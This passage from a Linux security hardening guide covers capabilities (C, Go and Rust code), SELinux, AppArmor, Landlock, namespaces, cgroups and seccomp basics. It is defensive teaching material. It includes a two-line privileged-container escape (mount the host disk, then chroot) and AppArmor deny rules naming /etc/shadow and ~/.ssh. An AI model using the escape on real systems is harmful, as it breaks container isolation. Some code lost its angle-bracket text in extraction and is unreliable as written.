# ep = effective + permitted for that binary

# Give ping raw socket capability
setcap cap_net_raw=ep /usr/bin/ping

# View capabilities on a file
getcap /usr/bin/ping
# /usr/bin/ping = cap_net_raw+ep

# Remove all file capabilities
setcap -r /usr/bin/ping

# View process capabilities
cat /proc/$$/status | grep -i cap
# or
capsh --print

# Drop capabilities in shell
capsh --drop=cap_net_raw --

# Check if running with specific cap
capsh --print | grep Current
```

### 5.3 Capability Implementation in C

```c
#include <sys/capability.h>
#include <sys/prctl.h>
#include 
#include 
#include 
#include 
#include 

/* Drop all capabilities except the ones needed */
int drop_capabilities(cap_value_t *keep_caps, int num_keep) {
    cap_t caps = cap_init();
    if (!caps) {
        perror("cap_init");
        return -1;
    }

    /* Start with empty sets */
    cap_clear(caps);

    /* Add only the required capabilities to permitted and effective */
    if (num_keep > 0) {
        if (cap_set_flag(caps, CAP_PERMITTED, num_keep, keep_caps, CAP_SET) != 0) {
            perror("cap_set_flag PERMITTED");
            cap_free(caps);
            return -1;
        }
        if (cap_set_flag(caps, CAP_EFFECTIVE, num_keep, keep_caps, CAP_SET) != 0) {
            perror("cap_set_flag EFFECTIVE");
            cap_free(caps);
            return -1;
        }
    }

    /* Apply the capability set */
    if (cap_set_proc(caps) != 0) {
        perror("cap_set_proc");
        cap_free(caps);
        return -1;
    }
    cap_free(caps);

    /* Set the bounding set to only what we need */
    /* First, enumerate all caps in bounding set and drop others */
    for (int cap = 0; cap <= CAP_LAST_CAP; cap++) {
        int found = 0;
        for (int i = 0; i < num_keep; i++) {
            if (keep_caps[i] == cap) { found = 1; break; }
        }
        if (!found) {
            if (prctl(PR_CAPBSET_DROP, cap, 0, 0, 0) != 0) {
                if (errno != EINVAL) {  /* EINVAL = cap doesn't exist, ok */
                    perror("PR_CAPBSET_DROP");
                    return -1;
                }
            }
        }
    }

    /* Lock: prevent regaining capabilities via setuid */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("PR_SET_NO_NEW_PRIVS");
        return -1;
    }

    return 0;
}

/* Temporarily raise a capability, perform action, lower it */
int with_capability(cap_value_t cap, void (*action)(void *), void *arg) {
    cap_t caps = cap_get_proc();
    if (!caps) return -1;

    /* Raise in effective set */
    if (cap_set_flag(caps, CAP_EFFECTIVE, 1, &cap, CAP_SET) != 0) {
        cap_free(caps);
        return -1;
    }
    if (cap_set_proc(caps) != 0) {
        cap_free(caps);
        return -1;
    }

    /* Execute the privileged action */
    action(arg);

    /* Lower from effective set */
    if (cap_set_flag(caps, CAP_EFFECTIVE, 1, &cap, CAP_CLEAR) != 0) {
        cap_free(caps);
        return -1;
    }
    if (cap_set_proc(caps) != 0) {
        cap_free(caps);
        return -1;
    }

    cap_free(caps);
    return 0;
}

/* Example: web server that needs only CAP_NET_BIND_SERVICE */
int main(void) {
    cap_value_t needed[] = { CAP_NET_BIND_SERVICE };
    
    if (drop_capabilities(needed, 1) != 0) {
        fprintf(stderr, "Failed to drop capabilities\n");
        return 1;
    }
    
    /* Now running with minimal privileges */
    /* Bind port 443... */
    
    return 0;
}
```

### 5.4 Capability Implementation in Go

```go
package main

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

// Linux capability constants
const (
	CAP_NET_BIND_SERVICE = 10
	CAP_NET_RAW          = 13
	CAP_SYS_ADMIN        = 21
	CAP_LAST_CAP         = 40

	// Capability version
	_LINUX_CAPABILITY_VERSION_3 = 0x20080522
)

type capHeader struct {
	version uint32
	pid     int32
}

type capData struct {
	effective   uint32
	permitted   uint32
	inheritable uint32
}

// DropAllCapabilities drops all capabilities except those specified.
// Must be called with appropriate privileges.
func DropAllCapabilities(keepCaps []int) error {
	// Lock OS thread - capabilities are per-thread on Linux
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hdr := capHeader{
		version: _LINUX_CAPABILITY_VERSION_3,
		pid:     0, // current process
	}

	var data [2]capData

	// Build the capability bitmask for what we want to keep
	for _, cap := range keepCaps {
		if cap > CAP_LAST_CAP {
			return fmt.Errorf("invalid capability: %d", cap)
		}
		idx := cap / 32
		bit := uint32(1) << uint(cap%32)
		data[idx].effective |= bit
		data[idx].permitted |= bit
	}

	// Set capabilities via capset syscall
	_, _, errno := syscall.Syscall(
		syscall.SYS_CAPSET,
		uintptr(unsafe.Pointer(&hdr)),
		uintptr(unsafe.Pointer(&data[0])),
		0,
	)
	if errno != 0 {
		return fmt.Errorf("capset failed: %w", errno)
	}

	// Set PR_SET_NO_NEW_PRIVS to prevent privilege escalation via execve
	if err := prctlNoNewPrivs(); err != nil {
		return fmt.Errorf("PR_SET_NO_NEW_PRIVS failed: %w", err)
	}

	return nil
}

// GetCapabilities returns current process capability sets
func GetCapabilities() (effective, permitted, inheritable uint64, err error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hdr := capHeader{
		version: _LINUX_CAPABILITY_VERSION_3,
		pid:     0,
	}
	var data [2]capData

	_, _, errno := syscall.Syscall(
		syscall.SYS_CAPGET,
		uintptr(unsafe.Pointer(&hdr)),
		uintptr(unsafe.Pointer(&data[0])),
		0,
	)
	if errno != 0 {
		return 0, 0, 0, fmt.Errorf("capget failed: %w", errno)
	}

	// Combine low and high 32-bit words into 64-bit values
	eff := uint64(data[0].effective) | (uint64(data[1].effective) << 32)
	perm := uint64(data[0].permitted) | (uint64(data[1].permitted) << 32)
	inh := uint64(data[0].inheritable) | (uint64(data[1].inheritable) << 32)

	return eff, perm, inh, nil
}

// HasCapability checks if the current process has the given capability
func HasCapability(cap int) (bool, error) {
	eff, _, _, err := GetCapabilities()
	if err != nil {
		return false, err
	}
	return (eff>>uint(cap))&1 == 1, nil
}

func prctlNoNewPrivs() error {
	const PR_SET_NO_NEW_PRIVS = 38
	_, _, errno := syscall.Syscall6(
		syscall.SYS_PRCTL,
		PR_SET_NO_NEW_PRIVS,
		1, 0, 0, 0, 0,
	)
	if errno != 0 {
		return errno
	}
	return nil
}

func main() {
	// Check current capabilities
	eff, perm, _, err := GetCapabilities()
	if err != nil {
		log.Fatalf("GetCapabilities: %v", err)
	}
	fmt.Printf("Effective capabilities: 0x%016x\n", eff)
	fmt.Printf("Permitted capabilities: 0x%016x\n", perm)

	// Check if we have NET_BIND_SERVICE
	hasBind, err := HasCapability(CAP_NET_BIND_SERVICE)
	if err != nil {
		log.Fatalf("HasCapability: %v", err)
	}
	fmt.Printf("Has CAP_NET_BIND_SERVICE: %v\n", hasBind)

	// Drop all capabilities except NET_BIND_SERVICE
	if os.Getuid() == 0 {
		if err := DropAllCapabilities([]int{CAP_NET_BIND_SERVICE}); err != nil {
			log.Fatalf("DropAllCapabilities: %v", err)
		}
		fmt.Println("Dropped all capabilities except NET_BIND_SERVICE")
	}
}
```

### 5.5 Capability Implementation in Rust

```rust
use std::io;
use std::mem;

// Linux capability syscall numbers and structures
const SYS_CAPGET: i64 = 125;
const SYS_CAPSET: i64 = 126;
const SYS_PRCTL:  i64 = 157;

const LINUX_CAPABILITY_VERSION_3: u32 = 0x20080522;
const PR_SET_NO_NEW_PRIVS: i64 = 38;
const PR_SET_KEEPCAPS: i64 = 8;

#[repr(C)]
struct CapHeader {
    version: u32,
    pid: i32,
}

#[repr(C)]
#[derive(Debug, Default, Clone, Copy)]
struct CapData {
    effective: u32,
    permitted: u32,
    inheritable: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Capability {
    ChownFiles       = 0,
    DacOverride      = 1,
    DacReadSearch    = 2,
    FOwner           = 3,
    FSetId           = 4,
    Kill             = 5,
    SetGid           = 6,
    SetUid           = 7,
    SetPCap          = 8,
    LinuxImmutable   = 9,
    NetBindService   = 10,
    NetBroadcast     = 11,
    NetAdmin         = 12,
    NetRaw           = 13,
    IpcLock          = 14,
    IpcOwner         = 15,
    SysModule        = 16,
    SysRawIO         = 17,
    SysChroot        = 18,
    SysPtrace        = 19,
    SysPacct         = 20,
    SysAdmin         = 21,
    SysBoot          = 22,
    SysNice          = 23,
    SysResource      = 24,
    SysTime          = 25,
    SysTtyConfig     = 26,
    MkNod            = 27,
    Lease            = 28,
    AuditWrite       = 29,
    AuditControl     = 30,
    SetFcap          = 31,
    MacOverride      = 32,
    MacAdmin         = 33,
    Syslog           = 34,
    WakeAlarm        = 35,
    BlockSuspend     = 36,
    AuditRead        = 37,
    PerfMon          = 38,
    Bpf              = 39,
    CheckpointRestore = 40,
}

pub struct Capabilities {
    data: [CapData; 2],
}

impl Capabilities {
    /// Get current process capabilities
    pub fn current() -> io::Result {
        let hdr = CapHeader {
            version: LINUX_CAPABILITY_VERSION_3,
            pid: 0,
        };
        let mut data = [CapData::default(); 2];

        let ret = unsafe {
            libc_capget(&hdr, data.as_mut_ptr())
        };
        if ret != 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(Capabilities { data })
    }

    /// Check if a capability is in the effective set
    pub fn is_effective(&self, cap: Capability) -> bool {
        let cap_num = cap as usize;
        let idx = cap_num / 32;
        let bit = 1u32 << (cap_num % 32);
        (self.data[idx].effective & bit) != 0
    }

    /// Check if a capability is in the permitted set
    pub fn is_permitted(&self, cap: Capability) -> bool {
        let cap_num = cap as usize;
        let idx = cap_num / 32;
        let bit = 1u32 << (cap_num % 32);
        (self.data[idx].permitted & bit) != 0
    }

    /// Set capabilities - only what's in `keep` will be retained
    pub fn drop_all_except(keep: &[Capability]) -> io::Result {
        let mut data = [CapData::default(); 2];

        for &cap in keep {
            let cap_num = cap as usize;
            let idx = cap_num / 32;
            let bit = 1u32 << (cap_num % 32);
            data[idx].effective |= bit;
            data[idx].permitted |= bit;
        }

        let hdr = CapHeader {
            version: LINUX_CAPABILITY_VERSION_3,
            pid: 0,
        };

        let ret = unsafe { libc_capset(&hdr, data.as_ptr()) };
        if ret != 0 {
            return Err(io::Error::last_os_error());
        }

        // Set no_new_privs to prevent re-gaining caps via execve
        set_no_new_privs()?;

        Ok(())
    }
}

/// Set PR_SET_NO_NEW_PRIVS - prevents gaining privileges via execve
pub fn set_no_new_privs() -> io::Result {
    let ret = unsafe {
        libc::prctl(PR_SET_NO_NEW_PRIVS as i32, 1, 0, 0, 0)
    };
    if ret != 0 {
        return Err(io::Error::last_os_error());
    }
    Ok(())
}

// Unsafe FFI wrappers
unsafe fn libc_capget(hdr: *const CapHeader, data: *mut CapData) -> i32 {
    libc::syscall(SYS_CAPGET, hdr, data) as i32
}

unsafe fn libc_capset(hdr: *const CapHeader, data: *const CapData) -> i32 {
    libc::syscall(SYS_CAPSET, hdr, data) as i32
}

fn main() -> io::Result {
    let caps = Capabilities::current()?;
    
    println!("Has SYS_ADMIN (effective): {}", caps.is_effective(Capability::SysAdmin));
    println!("Has NET_BIND_SERVICE (permitted): {}", caps.is_permitted(Capability::NetBindService));

    // In a real server: drop everything except what's needed
    // Capabilities::drop_all_except(&[Capability::NetBindService])?;
    
    Ok(())
}
```

---

## 6. Mandatory Access Control: SELinux and AppArmor

### 6.1 MAC vs DAC: The Fundamental Difference

**DAC (Discretionary Access Control)**: The file owner controls access. They can `chmod 777` their file and allow anyone to read it. The discretion lies with the owner.

**MAC (Mandatory Access Control)**: A central policy administrator controls access. The file owner CANNOT override the MAC policy even if they want to. The discretion lies with the policy.

This distinction is critical for system security: if root is compromised under a DAC-only system, the attacker gets everything. With MAC properly configured, even a compromised root is constrained by the MAC policy.

### 6.2 SELinux: Security-Enhanced Linux

SELinux was developed by the NSA and donated to the Linux kernel. It implements Type Enforcement (TE), Role-Based Access Control (RBAC), and Multi-Level Security (MLS).

**Core SELinux concepts:**

```
Subject (process) has a security context:
    system_u:system_r:httpd_t:s0

    |         |          |      |
    user      role       type   sensitivity:categories

Object (file) has a security context:
    system_u:object_r:httpd_sys_content_t:s0

Policy rule:
    allow httpd_t httpd_sys_content_t:file { read getattr open };
    
    "httpd processes are allowed to read httpd web content files"
```

**SELinux enforcement modes:**

```bash
# Check current mode
getenforce
# Enforcing / Permissive / Disabled

sestatus

# Temporarily switch to permissive (for testing)
setenforce 0  # Permissive
setenforce 1  # Enforcing

# Persistent mode in /etc/selinux/config
SELINUX=enforcing
SELINUXTYPE=targeted
```

**Working with SELinux contexts:**

```bash
# View file context
ls -Z /var/www/html/
# system_u:object_r:httpd_sys_content_t:s0 index.html

# View process context
ps auxZ | grep httpd
# system_u:system_r:httpd_t:s0            apache httpd ...

# Change file context (persistent)
chcon -t httpd_sys_content_t /var/www/html/myfile.html
# Or for subtrees:
semanage fcontext -a -t httpd_sys_content_t '/var/www/html(/.*)?'
restorecon -Rv /var/www/html/

# View process context for running process
cat /proc//attr/current
```

**SELinux policy modules (writing custom policy):**

```bash
# Generate policy from AVC denials (audit.log)
audit2allow -a -M mypolicy
# Inspect generated policy
cat mypolicy.te

# mypolicy.te example:
module mypolicy 1.0;

require {
    type myapp_t;
    type sysfs_t;
    class file { read open getattr };
}

# Allow myapp to read sysfs files
allow myapp_t sysfs_t:file { read open getattr };

# Compile and install
checkmodule -M -m -o mypolicy.mod mypolicy.te
semodule_package -o mypolicy.pp -m mypolicy.mod
semodule -i mypolicy.pp
```

**Investigating SELinux denials:**

```bash
# View AVC (Access Vector Cache) denials
ausearch -m avc -ts today
grep "avc:  denied" /var/log/audit/audit.log

# Example denial:
# type=AVC msg=audit(1234567890.123:456): avc:  denied
# { write } for  pid=1234 comm="myapp" name="config.db"
# dev="sda1" ino=12345
# scontext=system_u:system_r:myapp_t:s0
# tcontext=system_u:object_r:var_t:s0
# tclass=file permissive=0

# Interpret the denial
# myapp process (myapp_t) tried to write to a file with label var_t
# Fix: either relabel the file, or add a policy rule

# Debug with dontaudit (don't audit for noise reduction)
semodule -DB  # disable dontaudit rules
semodule -B   # re-enable dontaudit rules
```

**SELinux boolean switches:**

```bash
# List all booleans
getsebool -a | grep httpd

# Enable a boolean
setsebool -P httpd_can_network_connect on  # -P = persistent

# Common useful booleans
setsebool -P httpd_use_nfs on              # httpd can use NFS mounts
setsebool -P allow_ptrace on               # Allow ptrace (dev only!)
setsebool -P nis_enabled on                # NIS support
```

**MCS (Multi-Category Security) for container isolation:**

MCS is used by container runtimes (rkt, cri-o) to assign unique category pairs to containers, ensuring SELinux prevents inter-container access even when running as the same type.

```bash
# Two containers might have contexts:
# Container 1: system_u:system_r:container_t:s0:c1,c2
# Container 2: system_u:system_r:container_t:s0:c3,c4
# SELinux prevents c1,c2 from accessing c3,c4 resources
```

### 6.3 AppArmor: Path-Based MAC

AppArmor takes a different approach: instead of labeling every object, it uses pathnames. Profiles are attached to programs by name. This is simpler to understand and manage but less flexible than SELinux's label-based approach.

**AppArmor profile structure:**

```
/etc/apparmor.d/usr.bin.firefox

#include <tunables/global>

/usr/bin/firefox {
  #include <abstractions/base>
  #include <abstractions/X>
  #include <abstractions/fonts>

  # Capabilities
  capability sys_nice,

  # Network
  network inet tcp,
  network inet6 tcp,

  # Files (path-based)
  /usr/bin/firefox               mr,     # mapped read (mmap + read)
  /usr/lib/firefox/**            mr,
  @{HOME}/.mozilla/**            rw,     # user's Firefox profile
  /tmp/**                        rw,
  /proc/@{pid}/status            r,

  # Deny access to sensitive files
  deny /etc/shadow               r,
  deny /proc/sys/kernel/dmesg    r,
  deny @{HOME}/.ssh/**           rw,

  # Execute other programs
  /usr/bin/xdg-open             Cx -> xdg_open,   # child profile

  # Signal
  signal send set=(kill,term) peer=unconfined,

  # Mount
  # (not allowed unless explicitly permitted)
}
```

**Profile modes:**

```bash
# Load profile in enforce mode
apparmor_parser -r /etc/apparmor.d/usr.bin.myapp

# Load in complain mode (log but don't enforce)
apparmor_parser -C /etc/apparmor.d/usr.bin.myapp
# Or:
aa-complain /usr/bin/myapp

# Check profile status
apparmor_status
aa-status

# Parse AppArmor denials
dmesg | grep apparmor
grep "apparmor" /var/log/kern.log
grep "apparmor" /var/log/audit/audit.log
```

**Generate AppArmor profile from scratch:**

```bash
# Run in learning mode
aa-genprof /usr/bin/myapp
# Execute the program, do all normal operations
# Press S to scan logs, F to finish

# Or use aa-logprof to update existing profile from denials
aa-logprof

# View generated profile
cat /etc/apparmor.d/usr.bin.myapp
```

**AppArmor for containers (Kubernetes):**

```yaml
# Kubernetes Pod with AppArmor
apiVersion: v1
kind: Pod
metadata:
  name: myapp
  annotations:
    # AppArmor profile name (loaded on node)
    container.apparmor.security.beta.kubernetes.io/myapp: localhost/myapp-profile
spec:
  containers:
  - name: myapp
    image: myapp:latest
```

### 6.4 Landlock: Unprivileged Sandboxing (Linux 5.13+)

Landlock is a newer LSM that allows unprivileged sandboxing. Unlike SELinux/AppArmor which require root to configure, Landlock lets a process restrict itself (similar to seccomp, but for filesystem access).

```c
/* Landlock: restrict own filesystem access */
#include <linux/landlock.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include 
#include 
#include 
#include 
#include 
#include 

#ifndef landlock_create_ruleset
static inline int landlock_create_ruleset(
    const struct landlock_ruleset_attr *const attr,
    const size_t size,
    const __u32 flags)
{
    return syscall(__NR_landlock_create_ruleset, attr, size, flags);
}
#endif

#ifndef landlock_add_rule
static inline int landlock_add_rule(
    const int ruleset_fd,
    const enum landlock_rule_type rule_type,
    const void *const rule_attr,
    const __u32 flags)
{
    return syscall(__NR_landlock_add_rule, ruleset_fd, rule_type, rule_attr, flags);
}
#endif

#ifndef landlock_restrict_self
static inline int landlock_restrict_self(const int ruleset_fd, const __u32 flags)
{
    return syscall(__NR_landlock_restrict_self, ruleset_fd, flags);
}
#endif

int sandbox_with_landlock(const char *allowed_path, __u64 allowed_access) {
    struct landlock_ruleset_attr rs_attr = {
        .handled_access_fs =
            LANDLOCK_ACCESS_FS_EXECUTE    |
            LANDLOCK_ACCESS_FS_READ_FILE  |
            LANDLOCK_ACCESS_FS_READ_DIR   |
            LANDLOCK_ACCESS_FS_WRITE_FILE |
            LANDLOCK_ACCESS_FS_REMOVE_DIR |
            LANDLOCK_ACCESS_FS_REMOVE_FILE|
            LANDLOCK_ACCESS_FS_MAKE_CHAR  |
            LANDLOCK_ACCESS_FS_MAKE_DIR   |
            LANDLOCK_ACCESS_FS_MAKE_REG   |
            LANDLOCK_ACCESS_FS_MAKE_SOCK  |
            LANDLOCK_ACCESS_FS_MAKE_FIFO  |
            LANDLOCK_ACCESS_FS_MAKE_BLOCK |
            LANDLOCK_ACCESS_FS_MAKE_SYM   |
            LANDLOCK_ACCESS_FS_REFER      |
            LANDLOCK_ACCESS_FS_TRUNCATE,
    };

    /* Create a ruleset that handles all filesystem actions */
    int ruleset_fd = landlock_create_ruleset(&rs_attr, sizeof(rs_attr), 0);
    if (ruleset_fd < 0) {
        perror("landlock_create_ruleset");
        return -1;
    }

    /* Allow specific access to the given path */
    struct landlock_path_beneath_attr path_attr = {
        .allowed_access = allowed_access,
    };
    path_attr.parent_fd = open(allowed_path, O_PATH | O_CLOEXEC);
    if (path_attr.parent_fd < 0) {
        perror("open path");
        close(ruleset_fd);
        return -1;
    }

    if (landlock_add_rule(ruleset_fd, LANDLOCK_RULE_PATH_BENEATH,
                          &path_attr, 0) != 0) {
        perror("landlock_add_rule");
        close(path_attr.parent_fd);
        close(ruleset_fd);
        return -1;
    }
    close(path_attr.parent_fd);

    /* Lock the sandbox: no new privileges */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl NO_NEW_PRIVS");
        close(ruleset_fd);
        return -1;
    }

    /* Apply the ruleset to the current thread (and future children) */
    if (landlock_restrict_self(ruleset_fd, 0) != 0) {
        perror("landlock_restrict_self");
        close(ruleset_fd);
        return -1;
    }
    close(ruleset_fd);

    return 0;
}

int main(void) {
    /* Restrict process to only reading /tmp */
    __u64 allowed = LANDLOCK_ACCESS_FS_READ_FILE | LANDLOCK_ACCESS_FS_READ_DIR;
    
    if (sandbox_with_landlock("/tmp", allowed) != 0) {
        fprintf(stderr, "Landlock sandbox failed (kernel may not support it)\n");
        /* Non-fatal: continue without sandbox on older kernels */
    } else {
        printf("Landlock sandbox active: only /tmp is accessible\n");
    }

    /* Try to access /etc/passwd - should fail */
    FILE *f = fopen("/etc/passwd", "r");
    if (f) {
        printf("BUG: Accessed /etc/passwd (sandbox failed)\n");
        fclose(f);
    } else {
        printf("OK: /etc/passwd access denied (errno=%d: %s)\n",
               errno, strerror(errno));
    }

    return 0;
}
```

---

## 7. Linux Namespaces: Isolation Primitives

### 7.1 Namespace Overview

Linux namespaces provide isolation of global system resources. Each type of namespace wraps a specific resource type so that processes within a namespace see their own isolated instance.

```
Namespace Types and What They Isolate:
=======================================

Mount   (CLONE_NEWNS)    - Filesystem mount points
UTS     (CLONE_NEWUTS)   - Hostname and NIS domain name
IPC     (CLONE_NEWIPC)   - System V IPC, POSIX mq
PID     (CLONE_NEWPID)   - Process IDs
Network (CLONE_NEWNET)   - Network devices, stacks, ports
User    (CLONE_NEWUSER)  - User and group IDs
Cgroup  (CLONE_NEWCGROUP)- cgroup root directory
Time    (CLONE_NEWTIME)  - System clocks (5.6+)
```

**Namespaces are the foundation of containers.** A container is, fundamentally, a collection of namespaces + cgroups + some security policy.

### 7.2 PID Namespaces: Process Isolation

```
Host PID Namespace        Container PID Namespace
==================        =======================
PID 1 = systemd           PID 1 = container init (e.g., tini)
PID 2 = kthreadd          PID 2 = myapp
PID 100 = sshd            PID 3 = myapp-worker
PID 1500 = container_init
PID 1501 = myapp          (appears as PID 2 inside container)
PID 1502 = myapp-worker   (appears as PID 3 inside container)
```

```bash
# Create a new PID namespace
unshare --pid --fork --mount-proc /bin/bash

# Inside the new namespace
echo $$  # Will show 1 (we are PID 1 in this namespace)
ps aux   # Only sees our processes

# From host, view the container's namespace
ls -la /proc//ns/pid
# lrwxrwxrwx ... pid -> pid:[4026531836]

# Namespaces are identified by inode numbers
# Same inode = same namespace
```

**Security implications of PID namespaces:**
- Container cannot signal or ptrace host processes
- `/proc` inside container only shows container processes (with `--mount-proc`)
- Container init (PID 1) must reap zombie processes
- If container init dies, all processes in the namespace are killed

### 7.3 Network Namespaces: Network Isolation

```bash
# Create a new network namespace
ip netns add myns

# Execute command in namespace
ip netns exec myns ip addr show
# Only loopback by default

# Create a veth pair (virtual ethernet cable)
ip link add veth0 type veth peer name veth1

# Move one end into the namespace
ip link set veth1 netns myns

# Configure addresses
ip addr add 192.168.100.1/24 dev veth0
ip netns exec myns ip addr add 192.168.100.2/24 dev veth1

# Bring up interfaces
ip link set veth0 up
ip netns exec myns ip link set lo up
ip netns exec myns ip link set veth1 up

# Test connectivity
ping 192.168.100.2

# This is how container networking (bridge mode) works:
# Each container gets its own network namespace
# veth pairs connect container ns to host bridge
# The bridge (docker0, cni0) routes between containers
```

**Network namespace security:**
- Complete network stack isolation: separate routing tables, iptables rules, netfilter state
- Prevents network-based side-channel attacks between containers
- But: containers sharing a network namespace can see each other's traffic
- Network policy (Kubernetes NetworkPolicy, Cilium) enforces higher-level isolation

### 7.4 Mount Namespaces: Filesystem Isolation

```bash
# Create a new mount namespace
unshare --mount /bin/bash

# Inside: mount changes don't affect host
mount --bind /tmp/mydir /proc/sys  # Won't affect host

# Pivot root (used by container runtimes)
# More secure than chroot:
# 1. Create a new root filesystem
mkdir -p /tmp/newroot/{bin,lib,lib64,proc,sys,dev,tmp}
# Copy essential binaries
cp /bin/bash /tmp/newroot/bin/
# (in practice: use an OCI image layer)

# Pivot root
cd /tmp/newroot
mkdir put_old
pivot_root . put_old
# Old root is now at put_old
umount -l /put_old
rmdir /put_old
```

**Bind mounts in containers:**

```bash
# Mount read-only: expose config to container
mount --bind --make-private -o ro /etc/myapp /container/root/etc/myapp

# Propagation types:
# shared:   mounts propagate in both directions
# slave:    mounts propagate from master to slave only
# private:  no propagation (default for containers)
# unbindable: cannot be used as bind mount source

# Set propagation
mount --make-rprivate /  # Make entire tree private (container default)
```

### 7.5 User Namespaces: UID Remapping

As discussed, user namespaces map user IDs between namespaces. Critical for rootless containers.

```bash
# Rootless container: user 1000 on host appears as root in container
# /etc/subuid and /etc/subgid define allowed ranges:
cat /etc/subuid
# alice:100000:65536
# (alice can use UIDs 100000-165535 as subordinate UIDs)

# newuidmap sets up the mapping
newuidmap  0 100000 65536
# Maps container UID 0 -> host UID 100000
# Maps container UID 1 -> host UID 100001
# ... etc

# This means a container running as "root" (UID 0) is actually
# running as UID 100000 on the host
# Files created by container root are owned by 100000 on host
```

**Security implication**: Even if a container escape succeeds, the attacker is UID 100000 on the host, not UID 0. This limits damage significantly.

### 7.6 Namespace Security Attacks

**Namespace escape techniques:**

1. **runc CVE-2019-5736**: A file descriptor attack that allowed a malicious container to overwrite the host's `runc` binary by exploiting the `/proc/self/exe` symlink race during `docker exec`.

2. **Privileged container escape**: `docker run --privileged` disables namespace isolation. With `CAP_SYS_ADMIN`, a container can:
   ```bash
   # Mount the host filesystem
   mount /dev/sda1 /mnt
   # Escape to host
   chroot /mnt
   ```

3. **PID namespace escape via procfs**: If `/proc` is shared or improperly mounted, a container can access host process information.

```bash
# Detect privileged containers
cat /proc/self/status | grep CapEff
# If CapEff shows 0000003fffffffff or similar (all caps), container is privileged

# Check namespace isolation
ls -la /proc/self/ns/
# Compare inode numbers with host PID 1:
ls -la /proc/1/ns/  # On host
# If mount namespace inode matches, container has host mount ns (escape risk)
```

---

## 8. Control Groups (cgroups): Resource Isolation

### 8.1 cgroups v1 vs v2

**cgroups v1** (legacy): Multiple independent hierarchies. Each resource controller (cpu, memory, blkio) has its own separate hierarchy. This creates inconsistencies and complexity.

**cgroups v2** (unified hierarchy, since 4.5, default in modern distros): Single unified hierarchy. All controllers use one tree. Cleaner semantics, better delegation.

```bash
# Check if cgroups v2 is in use
mount | grep cgroup2
# cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,...)

# Or check:
cat /proc/mounts | grep cgroup
```

### 8.2 Memory Controls and DoS Prevention

```bash
# Create a cgroup for a service
mkdir /sys/fs/cgroup/myservice

# Set memory limit: 256MB
echo 268435456 > /sys/fs/cgroup/myservice/memory.max

# Set memory+swap limit (no swap for this cgroup)
echo 268435456 > /sys/fs/cgroup/myservice/memory.swap.max

# Set OOM score: prefer killing this process when system is OOM
echo 900 > /sys/fs/cgroup/myservice/memory.oom_group
# (or use per-process OOM score)
echo 500 > /proc//oom_score_adj  # Range: -1000 to +1000

# Add process to cgroup
echo  > /sys/fs/cgroup/myservice/cgroup.procs

# Memory statistics
cat /sys/fs/cgroup/myservice/memory.stat

# systemd integration (preferred)
systemctl set-property myservice.service MemoryMax=256M
systemctl set-property myservice.service MemorySwapMax=0
```

### 8.3 CPU Controls

```bash
# CPU weight (proportional sharing, replaces cpu.shares in v1)
echo 100 > /sys/fs/cgroup/myservice/cpu.weight
# Default is 100, range 1-10000

# CPU bandwidth limiting (hard limit)
# max = quota period (both in microseconds)
echo "50000 100000" > /sys/fs/cgroup/myservice/cpu.max
# 50% of one CPU (50ms per 100ms period)

# CPU pinning (cpuset)
echo "0-3" > /sys/fs/cgroup/myservice/cpuset.cpus
echo "0" > /sys/fs/cgroup/myservice/cpuset.mems

# systemd
systemctl set-property myservice.service CPUQuota=50%
systemctl set-property myservice.service CPUWeight=100
```

### 8.4 I/O Controls

```bash
# Limit disk I/O
# Format: major:minor rbps=<bytes/s> wbps=<bytes/s> riops=<ops/s> wiops=<ops/s>
echo "8:0 rbps=10485760 wbps=10485760" > /sys/fs/cgroup/myservice/io.max
# 10MB/s read, 10MB/s write on /dev/sda (8:0)

# View I/O stats
cat /sys/fs/cgroup/myservice/io.stat
```

### 8.5 cgroups as Security Controls

cgroups are NOT security boundaries in the traditional sense — they don't prevent access, they limit resource consumption. But they are critical for:

1. **DoS prevention**: A compromised or buggy process cannot exhaust system resources.
2. **Fork bombs**: `pids.max` limits the number of processes.
3. **Memory exhaustion**: `memory.max` prevents OOM from killing critical system processes.
4. **CPU starvation**: `cpu.max` prevents single process from monopolizing CPU.

```bash
# Fork bomb protection
echo 100 > /sys/fs/cgroup/myservice/pids.max

# systemd equivalent
systemctl set-property myservice.service TasksMax=100
```

**cgroups v2 delegation (for rootless containers):**

```bash
# Allow user to manage their own cgroup subtree
# 1. Enable delegation
echo "+memory +pids +cpu" > /sys/fs/cgroup/user.slice/user-1000.slice/cgroup.subtree_control

# 2. Change ownership
chown -R 1000:1000 /sys/fs/cgroup/user.slice/user-1000.slice/

# 3. User can now create sub-cgroups without root
mkdir /sys/fs/cgroup/user.slice/user-1000.slice/mycontainer
echo $$ > /sys/fs/cgroup/user.slice/user-1000.slice/mycontainer/cgroup.procs
```

---

## 9. Seccomp: System Call Filtering

### 9.1 Seccomp Fundamentals

Seccomp (Secure Computing Mode) filters system calls available to a process. It uses BPF (Berkeley Packet Filter) programs to make per-syscall decisions.

**Seccomp modes:**

- **Mode 1 (strict)**: Only `read`, `write`, `exit`, and `sigreturn` are allowed. Process is killed on any other syscall. Rarely used in practice.

- **Mode 2 (filter)**: A BPF program filters each syscall. The program can allow, deny (EPERM), kill the process, return a fake error, or send a SIGSYS signal.

### 9.2 Seccomp BPF Architecture

```
Process makes syscall
    |
    v
Kernel checks: does this thread have a seccomp filter?
    |
    v (yes)
BPF program runs with access to:
    struct seccomp_data {
        int nr;                 /* syscall number */
        __u32 arch;             /* AUDIT_ARCH_X86_64, etc. */
        __u64 instruction_pointer; /* caller's RIP */
        __u64 args[6];          /* syscall arguments (up to 6) */
    };
    |
    v
BPF program returns one of:
    SECCOMP_RET_ALLOW   - allow the syscall
    SECCOMP_RET_ERRNO   - return fake errno to process
    SECCOMP_RET_KILL_PROCESS - kill entire process group with SIGSYS
    SECCOMP_RET_KILL_THREAD  - kill only the offending thread
    SECCOMP_RET_TRAP    - send SIGSYS to process (can catch)
    SECCOMP_RET_TRACE   - notify ptracer (for strace/debugging)
